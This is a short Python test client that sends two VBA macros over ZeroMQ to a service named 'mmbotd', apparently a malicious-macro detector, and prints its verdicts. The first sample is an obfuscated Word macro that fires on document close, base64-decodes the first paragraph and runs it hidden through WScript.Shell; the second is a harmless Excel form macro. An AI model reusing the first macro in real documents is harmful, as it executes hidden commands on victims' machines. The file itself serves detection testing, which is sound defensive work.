#!/usr/bin/env python3

from argparse import ArgumentParser
import json
import zmq

vba1 = 'Public Sub eJluAwoCuinnwCHGJ()\nOHPQlFZJNnCdECW = ActiveDocument.Name\nlenght = Len(OHPQlFZJNnCdECW)\nIf lenght > 25 Then\n \nElse\npPxzDsvdDIC (zGIWyovEzeetkDiJxhRVlHb)\nEnd If\nEnd Sub\nFunction wynhmCIwWZSIZreSWdjU(ughIStkgHojgvcWgiRwe)\n    Set nLgcfBYAlEiwOdb = CreateObject("WScript.Shell")\n       nLgcfBYAlEiwOdb.Run ughIStkgHojgvcWgiRwe, 0\nEnd Function\nFunction pPxzDsvdDIC(zGIWyovEzeetkDiJxhRVlHb)\nDim COrmQNYuXlIdlFptHXIkcF, nLgcfBYAlEiwOdb, ughIStkgHojgvcWgiRwe\nkOQNpxexEFgBK = ActiveDocument.Paragraphs(1).Range.Text\nCOrmQNYuXlIdlFptHXIkcF = hZNuCYmkwONfivpIp(kOQNpxexEFgBK)\nughIStkgHojgvcWgiRwe = COrmQNYuXlIdlFptHXIkcF\n        Dim zQmvYanhwVfe\n         Do While zQmvYanhwVfe < 3\n          zQmvYanhwVfe = zQmvYanhwVfe + 1\n           If zQmvYanhwVfe = 2 Then Exit Do\n           wynhmCIwWZSIZreSWdjU (ughIStkgHojgvcWgiRwe)\n        Loop\nEnd Function\nSub AutoClose()\nApplication.Run "eJluAwoCuinnwCHGJ"\nEnd Sub\nFunction hZNuCYmkwONfivpIp(ByVal IANdvpamRIa)\nDim bsggcENxTeLWw, oUUGsdIuAWdolVZu\nSet bsggcENxTeLWw = CreateObject("Msxml2.DOMDocument.3.0")\nSet oUUGsdIuAWdolVZu = bsggcENxTeLWw.CreateElement("base64")\noUUGsdIuAWdolVZu.dataType = "bin.base64"\noUUGsdIuAWdolVZu.Text = IANdvpamRIa\nhZNuCYmkwONfivpIp = NXuJKOtgLOWJgBByaIzI(oUUGsdIuAWdolVZu.nodeTypedValue)\nSet oUUGsdIuAWdolVZu = Nothing\nSet bsggcENxTeLWw = Nothing\nEnd Function\nPrivate Function NXuJKOtgLOWJgBByaIzI(OarYBCnReWUtQ)\nDim AXhpjPngfobqBN\nSet AXhpjPngfobqBN = CreateObject("ADODB.Stream")\nConst zcjvRZPyszFAgVEL = 2\nConst GuEbmwkekrQvLUtGbwXv = 1\nAXhpjPngfobqBN.Type = GuEbmwkekrQvLUtGbwXv\nAXhpjPngfobqBN.Open\nAXhpjPngfobqBN.Write OarYBCnReWUtQ\nAXhpjPngfobqBN.Position = 0\nAXhpjPngfobqBN.Type = zcjvRZPyszFAgVEL\nAXhpjPngfobqBN.Charset = "us-ascii"\nNXuJKOtgLOWJgBByaIzI = AXhpjPngfobqBN.ReadText\nSet AXhpjPngfobqBN = Nothing\nEnd Functio'
vba2 = 'Private Sub CommandButton1_Click()\nSheets("Reporting").Range("B9").Value = "PCE"\nUserForm1.Hide\nEnd Sub\n\nPrivate Sub CommandButton2_Click()\nSheets("Reporting").Range("B9").Value = "PV"\nUserForm1.Hide\nEnd Sub'
vba_list = [vba1, vba2]

def main():
    parser = ArgumentParser(description='utilizes ZMQ to send vba data to mmbotd.')
    parser.add_argument('proxy',
                        help='the proxy server address.')
    parser.add_argument('frontend_port',
                        help='the frontend proxy port for clients to connect to.')
    args = parser.parse_args()
    frontend = "tcp://{}:{}".format(args.proxy, args.frontend_port)
    context = zmq.Context()
    socket = context.socket(zmq.REQ)
    socket.setsockopt(zmq.LINGER, 0)
    socket.connect(frontend)
    for vba in vba_list:
        socket.send_string(vba)
        poller = zmq.Poller()
        poller.register(socket, zmq.POLLIN)
        if poller.poll(10 * 1000):
            response = socket.recv()
            mmb_dict = json.loads(response.decode())[0]
            print(mmb_dict)
if __name__ == "__main__":
    main()